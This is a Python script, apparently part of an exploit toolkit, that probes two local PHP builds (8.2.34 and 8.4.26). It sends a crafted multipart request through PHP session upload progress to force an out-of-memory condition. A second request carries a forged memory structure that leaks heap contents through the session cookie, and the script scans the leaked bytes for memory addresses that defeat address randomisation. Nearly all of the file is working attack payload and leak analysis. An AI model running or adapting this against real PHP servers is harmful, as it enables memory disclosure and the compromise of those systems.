"""Capture the actual OOM-trigger response on 8.2.34 vs 8.4.26 (working).
Prints the response body + cookie of the leak request for both."""
import sys, os, time, struct, subprocess
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

def probe(port, label, mb=12, n=841):
    URL = f"http://127.0.0.1:{port}/"
    t = E.Target(URL, timeout=90.0, verbose=False)
    # OOM trigger
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (mb * 1024 * 1024)},
    ]
    try:
        r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=90.0)
    except Exception as e:
        r1 = f"[ERR {e}]".encode()
    time.sleep(0.4)
    print(f"\n===== {label} (port {port}) big={mb}MB =====", flush=True)
    print(f"  [OOM-trigger response] len={len(r1)}B", flush=True)
    print(f"  body head: {r1[:400]!r}", flush=True)
    # leak request
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=90.0)
    except Exception as e:
        r2 = f"[ERR {e}]".encode()
    raw = E.parse_cookie(r2)
    print(f"  [leak response] len={len(r2)}B  cookie={len(raw)}B", flush=True)
    if len(raw) >= 16:
        c = Counter()
        for i in range(0, len(raw) - 8, 8):
            v = int.from_bytes(raw[i:i + 8], "little")
            if 0x700000000000 <= v < 0x800000000000:
                c[v & ~0x1FFFFF] += 1
        print(f"  2MB-aligned top: {[(hex(k), v) for k, v in c.most_common(3)]}", flush=True)
    print(f"  leak body head: {r2[:300]!r}", flush=True)

probe(18111, "8.2.34")
time.sleep(1)
probe(18113, "8.4.26 (working)")
print("\n=== done ===", flush=True)
